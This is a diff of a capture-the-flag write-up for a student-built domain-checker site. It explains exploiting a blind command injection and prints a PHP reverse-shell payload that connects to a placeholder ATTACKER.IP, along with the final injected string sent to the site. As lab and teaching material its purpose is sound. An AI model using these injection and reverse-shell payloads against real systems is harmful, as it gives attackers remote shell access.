@@ -17,7 +17,37 @@ In my college level project I created this website that tells us if any domain/i
 
 The proper method to solve this challenge was doing a **Blind Command Injection**.
 
-Try to put ;id and see what happens. You have to use **netcat** and send the ;ls command. You'll see that there's a file called "flag.txt". 
+![image](https://user-images.githubusercontent.com/121932742/232248816-cce317cd-807a-4d28-819a-66b9ae2b9629.png)
+
+This is how the website functions 
+
+Now lets try to play with it
+
+![image](https://user-images.githubusercontent.com/121932742/232248852-8d8fc05b-850f-4fdf-aa32-4bc1dd4ac732.png)
+
+FISHY!
+
+Now this is a sign of a blind command injection, entering localhosts alone tells you that it is not active. But appending ;ls returns that it is active.
+
+After inspecting the request I intercepted in burp suite I found this:
+X-Powered-By: PHP/8.1.2–1ubuntu2.11
+
+Which tells two things.
+1- The OS is Ubuntu.
+2- The website’s backend is PHP.
+So I went to revshells.com and grabbed this reverse shell payload:
+
+```php -r '$sock=fsockopen("ATTACKER.IP",1337);shell_exec("sh <&3 >&3 2>&3");'```
+
+A nc listener is on as well as NGROK.
+The final payload I sent to the web application is this:
+
+```localhosts;php -r '$sock=fsockopen("ATTACKER.IP",1337);shell_exec("sh <&3 >&3 2>&3");```
+
+![image](https://user-images.githubusercontent.com/121932742/232248650-06314a44-3ae8-4c64-8299-605317d9f6bb.png)
+
+
+
 
 To print the flag, we can use the **cat** command or we can access to the directory (add /flag.txt to the URL). 
 
